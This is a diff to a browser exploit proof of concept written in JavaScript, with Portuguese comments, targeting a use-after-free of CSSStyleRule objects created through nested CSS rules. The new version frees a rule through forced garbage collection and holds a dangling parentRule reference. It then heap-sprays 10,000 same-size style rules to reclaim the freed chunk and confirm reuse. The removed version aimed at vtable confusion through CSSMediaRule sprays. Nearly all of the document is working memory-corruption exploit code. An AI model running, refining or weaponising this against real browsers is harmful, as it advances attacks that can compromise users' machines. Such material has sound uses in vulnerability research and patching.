@@ -13,7 +13,7 @@ function gc() {
         gcRec(10);
 }
 
-// Fase 1: Criar o UAF
+// Fase 1: UAF setup
 const style = document.createElement("style");
 document.head.appendChild(style);
 const sheet = style.sheet;
@@ -25,38 +25,30 @@ gc();
 
 const nested = nestedRules[0];
 nestedRules = null;
-gc();
+gc();  // Aqui o outer CSSStyleRule C++ é freed
 
-// Fase 2: Capturar o wrapper dangling ANTES do spray
-// (mantém referência JS para o C++ ptr já freed)
+// Fase 2: Capturar dangling ANTES do spray
 let danglingParent = nested.parentRule;
-document.write("Dangling capturado: " + (danglingParent !== null) + "<br>");
+let beforeSpray = danglingParent ? danglingParent.selectorText : "null";
+document.write("Before: " + beforeSpray + "<br>"); // Esperado: .outer
 
-// Fase 3: Heap spray — reusar o chunk de ~96 bytes do CSSStyleRule freed
-// Spray com CSSMediaRule (@media) que tem tamanho similar mas vtable DIFERENTE
-let spray = [];
+// Fase 3: Spray com mesmo tipo (CSSStyleRule ~96 bytes, mesmo bucket)
+let spraySheets = [];
 for (let i = 0; i < 10000; i++) {
     let el = document.createElement("style");
     document.head.appendChild(el);
-    // CSSMediaRule: vtable diferente de CSSStyleRule, tamanho similar (~96 bytes)
-    el.sheet.insertRule("@media all { .x" + i + " { color:red } }", 0);
-    spray.push(el.sheet.cssRules[0]);
+    // Mesmo tipo que o freed → mesmo size class → pode reusar o chunk
+    el.sheet.insertRule(".SPRAYED_" + i + " { color: red; & .n { color: blue; } }", 0);
+    el.sheet.cssRules[0]; // Força criação do wrapper C++ CSSStyleRule
+    spraySheets.push(el);
 }
 
-// Fase 4: Acesso UAF — vtable corrompida ou dados inválidos → crash
-if (danglingParent) {
-    // selectorText() → virtual dispatch → vtable[slot] no chunk reusado
-    // Se o chunk foi reusado por CSSMediaRule:
-    //   vtable de CSSMediaRule no lugar de CSSStyleRule
-    //   → slot errado → endereço inválido → SIGSEGV
-    let result = danglingParent.selectorText;
-    document.write("UAF result: " + result + "<br>");
-    
-    // Se não crashou acima, tentar acesso mais profundo:
-    // cssRules lê m_ruleListCSSOMWrapper (offset 0x58)
-    // se reusado → ponteiro inválido → SIGSEGV
-    let rules = danglingParent.cssRules;
-    document.write("cssRules count: " + rules.length + "<br>");
+// Fase 4: Verificar reuso
+let afterSpray = danglingParent ? danglingParent.selectorText : "null";
+document.write("After: " + afterSpray + "<br>");
+if (beforeSpray !== afterSpray) {
+    document.write("HEAP REUSE CONFIRMED: '" + beforeSpray + "' → '" + afterSpray + "'<br>");
+    document.write("UAF: lendo objeto diferente no mesmo endereço");
 }
 </script>
 </body>
